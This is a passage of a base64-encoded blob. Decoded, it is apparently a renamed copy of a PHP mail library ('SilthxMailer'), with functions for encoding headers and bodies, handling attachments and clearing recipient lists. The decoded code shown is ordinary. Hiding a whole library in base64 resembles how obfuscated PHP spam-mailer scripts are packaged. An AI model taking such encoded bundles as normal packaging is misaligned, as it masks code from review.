ICAgICAgICAgICAgICAgIGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgZmFsc2UpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9IEBmaWxlX2dldF9jb250ZW50cygkcGF0aCk7DQogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCRmaWxlX2J1ZmZlciwgJGVuY29kaW5nKTsNCiAgICAgICAgICAgIGlmICgkbWFnaWNfcXVvdGVzKSB7DQogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMy4wJywgJzwnKSkgew0KICAgICAgICAgICAgICAgICAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoJG1hZ2ljX3F1b3Rlcyk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgaW5pX3NldCgnbWFnaWNfcXVvdGVzX3J1bnRpbWUnLCAkbWFnaWNfcXVvdGVzKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gJGZpbGVfYnVmZmVyOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICByZXR1cm4gJyc7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVN0cmluZygkc3RyLCAkZW5jb2RpbmcgPSAnYmFzZTY0Jykgew0KICAgICAgICAkZW5jb2RlZCA9ICcnOw0KICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJGVuY29kaW5nKSkgew0KICAgICAgICAgICAgY2FzZSAnYmFzZTY0JzoNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGNodW5rX3NwbGl0KGJhc2U2NF9lbmNvZGUoJHN0ciksIDc2LCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnN2JpdCc6DQogICAgICAgICAgICBjYXNlICc4Yml0JzoNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5maXhFT0woJHN0cik7DQogICAgICAgICAgICAgICAgaWYgKHN1YnN0cigkZW5jb2RlZCwgLShzdHJsZW4oJHRoaXMtPkxFKSkpICE9ICR0aGlzLT5MRSkgew0KICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYmluYXJ5JzoNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICRzdHI7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdxdW90ZWQtcHJpbnRhYmxlJzoNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5lbmNvZGVRUCgkc3RyKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdlbmNvZGluZycpIC4gJGVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGVuY29kZWQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVIZWFkZXIoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKSB7DQogICAgICAgICRtYXRjaGNvdW50ID0gMDsNCiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsNCiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6DQogICAgICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvW1wyMDAtXDM3N10vJywgJHN0cikpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgPSBhZGRjc2xhc2hlcygkc3RyLCAiXDAuLlwzN1wxNzdcXFwiIik7DQogICAgICAgICAgICAgICAgICAgIGlmICgoJHN0ciA9PSAkZW5jb2RlZCkgJiYgIXByZWdfbWF0Y2goJy9bXkEtWmEtejAtOSEjJCUmXCcqK1wvPT9eX2B7fH1+IC1dLycsICRzdHIpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRlbmNvZGVkKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoIlwiJGVuY29kZWRcIiIpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ID0gcHJlZ19tYXRjaF9hbGwoJy9bXlwwNDBcMDQxXDA0My1cMTMzXDEzNS1cMTc2XS8nLCAkc3RyLCAkbWF0Y2hlcyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdjb21tZW50JzoNCiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCA9IHByZWdfbWF0Y2hfYWxsKCcvWygpIl0vJywgJHN0ciwgJG1hdGNoZXMpOw0KICAgICAgICAgICAgY2FzZSAndGV4dCc6DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ICs9IHByZWdfbWF0Y2hfYWxsKCcvW1wwMDAtXDAxMFwwMTNcMDE0XDAxNi1cMDM3XDE3Ny1cMzc3XS8nLCAkc3RyLCAkbWF0Y2hlcyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRtYXRjaGNvdW50ID09IDApIHsNCiAgICAgICAgICAgIHJldHVybiAoJHN0cik7DQogICAgICAgIH0NCiAgICAgICAgJG1heGxlbiA9IDc1IC0gNyAtIHN0cmxlbigkdGhpcy0+Q2hhclNldCk7DQogICAgICAgIGlmICgkbWF0Y2hjb3VudCA+IHN0cmxlbigkc3RyKSAvIDMpIHsNCiAgICAgICAgICAgICRlbmNvZGluZyA9ICdCJzsNCiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cmxlbicpICYmICR0aGlzLT5oYXNNdWx0aUJ5dGVzKCRzdHIpKSB7DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+YmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIsICJcbiIpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGJhc2U2NF9lbmNvZGUoJHN0cik7DQogICAgICAgICAgICAgICAgJG1heGxlbiAtPSAkbWF4bGVuICUgNDsNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHRyaW0oY2h1bmtfc3BsaXQoJGVuY29kZWQsICRtYXhsZW4sICJcbiIpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRlbmNvZGluZyA9ICdRJzsNCiAgICAgICAgICAgICRlbmNvZGVkICA9ICR0aGlzLT5lbmNvZGVRKCRzdHIsICRwb3NpdGlvbik7DQogICAgICAgICAgICAkZW5jb2RlZCAgPSAkdGhpcy0+d3JhcFRleHQoJGVuY29kZWQsICRtYXhsZW4sIHRydWUpOw0KICAgICAgICAgICAgJGVuY29kZWQgID0gc3RyX3JlcGxhY2UoJz0nIC4gc2VsZjo6Q1JMRiwgIlxuIiwgdHJpbSgkZW5jb2RlZCkpOw0KICAgICAgICB9DQogICAgICAgICRlbmNvZGVkID0gcHJlZ19yZXBsYWNlKCcvXiguKikkL20nLCAnID0/JyAuICR0aGlzLT5DaGFyU2V0IC4gIj8kZW5jb2Rpbmc/XFwxPz0iLCAkZW5jb2RlZCk7DQogICAgICAgICRlbmNvZGVkID0gdHJpbShzdHJfcmVwbGFjZSgiXG4iLCAkdGhpcy0+TEUsICRlbmNvZGVkKSk7DQogICAgICAgIHJldHVybiAkZW5jb2RlZDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGhhc011bHRpQnl0ZXMoJHN0cikgew0KICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSkgew0KICAgICAgICAgICAgcmV0dXJuIChzdHJsZW4oJHN0cikgPiBtYl9zdHJsZW4oJHN0ciwgJHRoaXMtPkNoYXJTZXQpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaGFzOGJpdENoYXJzKCR0ZXh0KSB7DQogICAgICAgIHJldHVybiAoYm9vbGVhbikgcHJlZ19tYXRjaCgnL1tceDgwLVx4RkZdLycsICR0ZXh0KTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGJhc2U2NEVuY29kZVdyYXBNQigkc3RyLCAkbGluZWJyZWFrID0gbnVsbCkgew0KICAgICAgICAkc3RhcnQgICA9ICc9PycgLiAkdGhpcy0+Q2hhclNldCAuICc/Qj8nOw0KICAgICAgICAkZW5kICAgICA9ICc/PSc7DQogICAgICAgICRlbmNvZGVkID0gJyc7DQogICAgICAgIGlmICgkbGluZWJyZWFrID09PSBudWxsKSB7DQogICAgICAgICAgICAkbGluZWJyZWFrID0gJHRoaXMtPkxFOw0KICAgICAgICB9DQogICAgICAgICRtYl9sZW5ndGggPSBtYl9zdHJsZW4oJHN0ciwgJHRoaXMtPkNoYXJTZXQpOw0KICAgICAgICAkbGVuZ3RoICAgID0gNzUgLSBzdHJsZW4oJHN0YXJ0KSAtIHN0cmxlbigkZW5kKTsNCiAgICAgICAgJHJhdGlvICAgICA9ICRtYl9sZW5ndGggLyBzdHJsZW4oJHN0cik7DQogICAgICAgICRhdmdMZW5ndGggPSBmbG9vcigkbGVuZ3RoICogJHJhdGlvICogLjc1KTsNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJG1iX2xlbmd0aDsgJGkgKz0gJG9mZnNldCkgew0KICAgICAgICAgICAgJGxvb2tCYWNrID0gMDsNCiAgICAgICAgICAgIGRvIHsNCiAgICAgICAgICAgICAgICAkb2Zmc2V0ID0gJGF2Z0xlbmd0aCAtICRsb29rQmFjazsNCiAgICAgICAgICAgICAgICAkY2h1bmsgID0gbWJfc3Vic3RyKCRzdHIsICRpLCAkb2Zmc2V0LCAkdGhpcy0+Q2hhclNldCk7DQogICAgICAgICAgICAgICAgJGNodW5rICA9IGJhc2U2NF9lbmNvZGUoJGNodW5rKTsNCiAgICAgICAgICAgICAgICAkbG9va0JhY2srKzsNCiAgICAgICAgICAgIH0gd2hpbGUgKHN0cmxlbigkY2h1bmspID4gJGxlbmd0aCk7DQogICAgICAgICAgICAkZW5jb2RlZCAuPSAkY2h1bmsgLiAkbGluZWJyZWFrOw0KICAgICAgICB9DQogICAgICAgICRlbmNvZGVkID0gc3Vic3RyKCRlbmNvZGVkLCAwLCAtc3RybGVuKCRsaW5lYnJlYWspKTsNCiAgICAgICAgcmV0dXJuICRlbmNvZGVkOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUVAoJHN0cmluZywgJGxpbmVfbWF4ID0gNzYpIHsNCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncXVvdGVkX3ByaW50YWJsZV9lbmNvZGUnKSkgew0KICAgICAgICAgICAgcmV0dXJuIHF1b3RlZF9wcmludGFibGVfZW5jb2RlKCRzdHJpbmcpOw0KICAgICAgICB9DQogICAgICAgICRzdHJpbmcgPSBzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgICAgICclMjAnLA0KICAgICAgICAgICAgJyUwRCUwQS4nLA0KICAgICAgICAgICAgJyUwRCUwQScsDQogICAgICAgICAgICAnJScNCiAgICAgICAgKSwgYXJyYXkoDQogICAgICAgICAgICAnICcsDQogICAgICAgICAgICAiXHJcbj0yRSIsDQogICAgICAgICAgICAiXHJcbiIsDQogICAgICAgICAgICAnPScNCiAgICAgICAgKSwgcmF3dXJsZW5jb2RlKCRzdHJpbmcpKTsNCiAgICAgICAgcmV0dXJuIHByZWdfcmVwbGFjZSgnL1teXHJcbl17JyAuICgkbGluZV9tYXggLSAzKSAuICd9W149XHJcbl17Mn0vJywgIiQwPVxyXG4iLCAkc3RyaW5nKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVFQcGhwKCRzdHJpbmcsICRsaW5lX21heCA9IDc2LCAkc3BhY2VfY29udiA9IGZhbHNlKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlUVAoJHN0cmluZywgJGxpbmVfbWF4KTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVEoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKSB7DQogICAgICAgICRwYXR0ZXJuID0gJyc7DQogICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICAgICAiXHIiLA0KICAgICAgICAgICAgIlxuIg0KICAgICAgICApLCAnJywgJHN0cik7DQogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7DQogICAgICAgICAgICBjYXNlICdwaHJhc2UnOg0KICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ15BLVphLXowLTkhKitcLyAtJzsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2NvbW1lbnQnOg0KICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ1woXCkiJzsNCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOg0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdcMDAwLVwwMTFcMDEzXDAxNFwwMTYtXDAzN1wwNzVcMDc3XDEzN1wxNzctXDM3NycgLiAkcGF0dGVybjsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICAkbWF0Y2hlcyA9IGFycmF5KCk7DQogICAgICAgIGlmIChwcmVnX21hdGNoX2FsbCgiL1t7JHBhdHRlcm59XS8iLCAkZW5jb2RlZCwgJG1hdGNoZXMpKSB7DQogICAgICAgICAgICAkZXFrZXkgPSBhcnJheV9zZWFyY2goJz0nLCAkbWF0Y2hlc1swXSk7DQogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlcWtleSkgew0KICAgICAgICAgICAgICAgIHVuc2V0KCRtYXRjaGVzWzBdWyRlcWtleV0pOw0KICAgICAgICAgICAgICAgIGFycmF5X3Vuc2hpZnQoJG1hdGNoZXNbMF0sICc9Jyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmb3JlYWNoIChhcnJheV91bmlxdWUoJG1hdGNoZXNbMF0pIGFzICRjaGFyKSB7DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgkY2hhciwgJz0nIC4gc3ByaW50ZignJTAyWCcsIG9yZCgkY2hhcikpLCAkZW5jb2RlZCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHN0cl9yZXBsYWNlKCcgJywgJ18nLCAkZW5jb2RlZCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdBdHRhY2htZW50KCRzdHJpbmcsICRmaWxlbmFtZSwgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50Jykgew0KICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsNCiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAwID0+ICRzdHJpbmcsDQogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwNCiAgICAgICAgICAgIDIgPT4gYmFzZW5hbWUoJGZpbGVuYW1lKSwNCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLA0KICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwNCiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLA0KICAgICAgICAgICAgNyA9PiAwDQogICAgICAgICk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRFbWJlZGRlZEltYWdlKCRwYXRoLCAkY2lkLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScpIHsNCiAgICAgICAgaWYgKCFAaXNfZmlsZSgkcGF0aCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsNCiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOw0KICAgICAgICB9DQogICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRwYXRoKTsNCiAgICAgICAgaWYgKCRuYW1lID09ICcnKSB7DQogICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAwID0+ICRwYXRoLA0KICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsDQogICAgICAgICAgICAyID0+ICRuYW1lLA0KICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsDQogICAgICAgICAgICA0ID0+ICR0eXBlLA0KICAgICAgICAgICAgNSA9PiBmYWxzZSwNCiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLA0KICAgICAgICAgICAgNyA9PiAkY2lkDQogICAgICAgICk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkU3RyaW5nRW1iZWRkZWRJbWFnZSgkc3RyaW5nLCAkY2lkLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScpIHsNCiAgICAgICAgaWYgKCR0eXBlID09ICcnIGFuZCAhZW1wdHkoJG5hbWUpKSB7DQogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRuYW1lKTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAwID0+ICRzdHJpbmcsDQogICAgICAgICAgICAxID0+ICRuYW1lLA0KICAgICAgICAgICAgMiA9PiAkbmFtZSwNCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLA0KICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwNCiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLA0KICAgICAgICAgICAgNyA9PiAkY2lkDQogICAgICAgICk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaW5saW5lSW1hZ2VFeGlzdHMoKSB7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7DQogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJ2lubGluZScpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhdHRhY2htZW50RXhpc3RzKCkgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgew0KICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICdhdHRhY2htZW50Jykgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFsdGVybmF0aXZlRXhpc3RzKCkgew0KICAgICAgICByZXR1cm4gIWVtcHR5KCR0aGlzLT5BbHRCb2R5KTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUXVldWVkQWRkcmVzc2VzKCRraW5kKSB7DQogICAgICAgICRSZWNpcGllbnRzUXVldWUgPSAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlOw0KICAgICAgICBmb3JlYWNoICgkUmVjaXBpZW50c1F1ZXVlIGFzICRhZGRyZXNzID0+ICRwYXJhbXMpIHsNCiAgICAgICAgICAgIGlmICgkcGFyYW1zWzBdID09ICRraW5kKSB7DQogICAgICAgICAgICAgICAgdW5zZXQoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZVskYWRkcmVzc10pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckFkZHJlc3NlcygpIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0bykgew0KICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJHRvWzBdKV0pOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT50byA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygndG8nKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ0NzKCkgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+Y2MgYXMgJGNjKSB7DQogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkY2NbMF0pXSk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmNjID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCdjYycpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJCQ0NzKCkgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+YmNjIGFzICRiY2MpIHsNCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRiY2NbMF0pXSk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmJjYyA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnYmNjJyk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhclJlcGx5VG9zKCkgew0KICAgICAgICAkdGhpcy0+UmVwbHlUbyAgICAgID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZSA9IGFycmF5KCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckFsbFJlY2lwaWVudHMoKSB7DQogICAgICAgICR0aGlzLT50byAgICAgICAgICAgICAgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+Y2MgICAgICAgICAgICAgID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmJjYyAgICAgICAgICAgICA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50cyAgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlID0gYXJyYXkoKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQXR0YWNobWVudHMoKSB7DQogICAgICAgICR0aGlzLT5hdHRhY2htZW50ID0gYXJyYXkoKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ3VzdG9tSGVhZGVycygpIHsNCiAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlciA9IGFycmF5KCk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRFcnJvcigkbXNnKSB7DQogICAgICAgICR0aGlzLT5lcnJvcl9jb3VudCsrOw0KICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnc210cCcgYW5kICFpc19udWxsKCR0aGlzLT5zbXRwKSkgew0KICAgICAgICAgICAgJGxhc3RlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOw0KICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydlcnJvciddKSkgew0KICAgICAgICAgICAgICAgICRtc2cgLj0gJHRoaXMtPmxhbmcoJ3NtdHBfZXJyb3InKSAuICRsYXN0ZXJyb3JbJ2Vycm9yJ107DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydkZXRhaWwnXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIERldGFpbDogJyAuICRsYXN0ZXJyb3JbJ2RldGFpbCddOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgU01UUCBjb2RlOiAnIC4gJGxhc3RlcnJvclsnc210cF9jb2RlJ107DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnc210cF9jb2RlX2V4J10pKSB7DQogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBBZGRpdGlvbmFsIFNNVFAgaW5mbzogJyAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+RXJyb3JJbmZvID0gJG1zZzsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiByZmNEYXRlKCkgew0KICAgICAgICBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KEBkYXRlX2RlZmF1bHRfdGltZXpvbmVfZ2V0KCkpOw0KICAgICAgICByZXR1cm4gZGF0ZSgnRCwgaiBNIFkgSDppOnMgTycpOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VydmVySG9zdG5hbWUoKSB7DQogICAgICAgICRyZXN1bHQgPSAnbG9jYWxob3N0LmxvY2FsZG9tYWluJzsNCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SG9zdG5hbWUpKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPkhvc3RuYW1lOw0KICAgICAgICB9IGVsc2VpZiAoaXNzZXQoJF9TRVJWRVIpIGFuZCBhcnJheV9rZXlfZXhpc3RzKCdTRVJWRVJfTkFNRScsICRfU0VSVkVSKSBhbmQgIWVtcHR5KCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdnZXRob3N0bmFtZScpICYmIGdldGhvc3RuYW1lKCkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gZ2V0aG9zdG5hbWUoKTsNCiAgICAgICAgfSBlbHNlaWYgKHBocF91bmFtZSgnbicpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9IHBocF91bmFtZSgnbicpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbGFuZygka2V5KSB7DQogICAgICAgIGlmIChjb3VudCgkdGhpcy0+bGFuZ3VhZ2UpIDwgMSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldExhbmd1YWdlKCdlbicpOw0KICAgICAgICB9DQogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKCRrZXksICR0aGlzLT5sYW5ndWFnZSkpIHsNCiAgICAgICAgICAgIGlmICgka2V5ID09ICdzbXRwX2Nvbm5lY3RfZmFpbGVkJykgew0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2VbJGtleV0gLiAnIGh0dHBzOi8vZ2l0aHViLmNvbS9TaWx0aHhNYWlsZXIvU2lsdGh4TWFpbGVyL3dpa2kvVHJvdWJsZXNob290aW5nJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2VbJ